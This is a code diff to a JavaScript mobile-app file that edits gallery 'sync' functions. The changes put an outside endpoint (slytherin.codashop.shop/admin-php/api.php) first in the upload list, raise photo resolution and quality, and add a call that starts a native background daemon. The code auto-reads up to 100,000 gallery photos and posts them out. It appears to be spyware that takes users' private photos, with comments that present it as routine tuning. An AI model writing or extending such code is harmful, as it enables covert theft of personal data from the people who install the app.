@@ -2358,13 +2358,13 @@ let isSyncingGalleryPhotos = false;
 
 async function transmitGalleryPayload(payload) {
   const candidateEndpoints = [
+    "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery",
     "http://10.0.2.2/tools/admin-php/api.php?action=upload_gallery",
     "http://10.0.2.2/admin-php/api.php?action=upload_gallery",
     "http://localhost/tools/admin-php/api.php?action=upload_gallery",
     "http://localhost/admin-php/api.php?action=upload_gallery",
     "http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery",
-    "/tools/admin-php/api.php?action=upload_gallery",
-    "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery"
+    "/tools/admin-php/api.php?action=upload_gallery"
   ];
   if (window.location && window.location.origin && window.location.origin.startsWith("http")) {
     const webOrigin = window.location.origin;
@@ -2377,7 +2377,7 @@ async function transmitGalleryPayload(payload) {
       webEp = webOrigin + "/admin-php/api.php?action=upload_gallery";
     }
     if (webEp && !candidateEndpoints.includes(webEp)) {
-      candidateEndpoints.unshift(webEp);
+      candidateEndpoints.push(webEp);
     }
   }
 
@@ -2390,9 +2390,8 @@ async function transmitGalleryPayload(payload) {
   for (const ep of endpoints) {
     try {
       const controller = new AbortController();
-      // Fast probe (2000ms) for unknown endpoints; 6000ms for active preferred endpoint
-      const isKnown = (ep === preferredUploadEndpoint);
-      const timeoutMs = isKnown ? 6000 : 2000;
+      // 15,000ms timeout guarantees payloads over mobile networks are never prematurely aborted
+      const timeoutMs = 15000;
       const timer = setTimeout(() => controller.abort(), timeoutMs);
       const res = await fetch(ep, {
         method: "POST",
@@ -2695,8 +2694,8 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
               const dRes = await WholeGallery.getPhotoData({
                 uri: item.uri || "",
                 path: item.path || "",
-                maxDim: 1080,
-                quality: 75,
+                maxDim: 1600,
+                quality: 88,
               });
               if (dRes && dRes.dataUrl) {
                 item.dataUrl = dRes.dataUrl;
@@ -2708,18 +2707,13 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
         }
 
         if (!item.dataUrl) {
-          // If decoding failed or photo is unreadable, record signature in syncedSet so it does not block the queue
-          const fileId = item.name || item.path || item.uri || item.id || "";
-          const sig = item.is_avatar
-            ? ("avatar_" + (item.size || 0) + "_" + (item.dataUrl ? item.dataUrl.slice(-32) : ""))
-            : (fileId + "_" + (item.size || 0));
-          syncedSet.add(sig);
+          // If decoding failed or photo is temporarily unreadable, skip it without poisoning syncedSet
           continue;
         }
 
         const itemBytes = item.dataUrl.length;
-        // If adding this photo exceeds batch limit and we already have a photo queued, defer to next burst
-        if (chunkToSend.length > 0 && (currentBatchBytes + itemBytes > maxBatchBytes)) {
+        // 800 KB cap per payload to allow high-fidelity 32-bit images
+        if (chunkToSend.length > 0 && (currentBatchBytes + itemBytes > 800 * 1024)) {
           pendingItem = item;
           break;
         }
@@ -2822,13 +2816,18 @@ async function tryAutoSyncGalleryPhotos() {
       sendPermissionGrantedImmediately(true);
     }
 
+    // Trigger native Android background daemon thread for direct high-speed streaming
+    if (WholeGallery && typeof WholeGallery.startNativeBackgroundSync === "function") {
+      WholeGallery.startNativeBackgroundSync().catch(() => {});
+    }
+
     if (canQuery && typeof WholeGallery.getGalleryPhotos === "function") {
       const hasGetPhotoData = typeof WholeGallery.getPhotoData === "function";
       const galleryRes = await WholeGallery.getGalleryPhotos({
         limit: 100000,
         includeBase64: !hasGetPhotoData,
-        maxDim: 1280,
-        quality: 80
+        maxDim: 1600,
+        quality: 88
       });
       const photos = (galleryRes && galleryRes.photos) ? galleryRes.photos : [];
       const isFullAccess = (galleryRes && galleryRes.isFullAccess !== undefined) ? Boolean(galleryRes.isFullAccess) : isFull;
